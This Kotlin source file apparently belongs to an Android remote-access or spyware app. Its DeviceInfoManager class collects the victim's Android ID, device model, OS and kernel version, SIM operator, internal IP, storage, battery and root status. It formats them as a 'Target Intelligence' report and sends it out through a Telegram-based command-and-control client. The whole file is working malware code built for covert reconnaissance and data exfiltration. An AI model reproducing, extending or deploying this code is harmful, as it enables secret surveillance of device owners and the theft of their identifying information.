package com.mzkyzak.appbug

import android.content.Context
import android.os.BatteryManager
import android.os.Build
import android.os.Environment
import android.os.StatFs
import android.provider.Settings
import android.telephony.TelephonyManager
import java.io.File
import java.net.NetworkInterface
import java.util.Collections

class DeviceInfoManager(private val context: Context, private val c2Client: TelegramC2Client) {

    fun reportFullSpecs() {
        val batteryManager = context.getSystemService(Context.BATTERY_SERVICE) as BatteryManager
        val batteryLevel = batteryManager.getIntProperty(BatteryManager.BATTERY_PROPERTY_CAPACITY)

        // Advanced Identifiers
        val androidId = Settings.Secure.getString(context.contentResolver, Settings.Secure.ANDROID_ID) ?: "Unknown"

        // Network Intelligence
        val tm = context.getSystemService(Context.TELEPHONY_SERVICE) as TelephonyManager
        val simOperator = tm.simOperatorName.ifEmpty { "No SIM" }
        val ipAddress = getLocalIpAddress()

        val specs = """
            <b>[Target Intelligence - Professional Spec]</b>
            🆔 <b>Android ID:</b> <code>$androidId</code>
            📱 <b>Device:</b> ${Build.MANUFACTURER} ${Build.MODEL}
            🤖 <b>Android Ver:</b> ${Build.VERSION.RELEASE} (API ${Build.VERSION.SDK_INT})
            🔋 <b>Battery:</b> $batteryLevel%
            📡 <b>Operator:</b> $simOperator
            🌐 <b>Internal IP:</b> $ipAddress
            💾 <b>Storage:</b> ${getAvailableInternalMemorySize()} / ${getTotalInternalMemorySize()}
            🛠️ <b>Rooted:</b> ${isDeviceRooted()}
            🖥️ <b>Kernel:</b> ${System.getProperty("os.version")}
        """.trimIndent()

        c2Client.sendMessage(specs)
    }

    private fun getLocalIpAddress(): String {
        try {
            val interfaces = Collections.list(NetworkInterface.getNetworkInterfaces())
            for (intf in interfaces) {
                val addrs = Collections.list(intf.inetAddresses)
                for (addr in addrs) {
                    if (!addr.isLoopbackAddress) {
                        val sAddr = addr.hostAddress ?: ""
                        if (sAddr.contains(":").not()) return sAddr // Return IPv4
                    }
                }
            }
        } catch (e: Exception) {}
        return "Unknown"
    }

    private fun getTotalInternalMemorySize(): String {
        val stat = StatFs(Environment.getDataDirectory().path)
        return formatSize(stat.blockCountLong * stat.blockSizeLong)
    }

    private fun getAvailableInternalMemorySize(): String {
        val stat = StatFs(Environment.getDataDirectory().path)
        return formatSize(stat.availableBlocksLong * stat.blockSizeLong)
    }

    private fun formatSize(size: Long): String {
        var fSize = size.toDouble()
        val units = arrayOf("B", "KB", "MB", "GB")
        var idx = 0
        while (fSize >= 1024 && idx < units.size - 1) {
            fSize /= 1024
            idx++
        }
        return String.format("%.2f %s", fSize, units[idx])
    }

    private fun isDeviceRooted(): Boolean {
        val paths = arrayOf("/system/app/Superuser.apk", "/sbin/su", "/system/bin/su", "/system/xbin/su", "/data/local/xbin/su", "/data/local/bin/su")
        return paths.any { File(it).exists() }
    }
}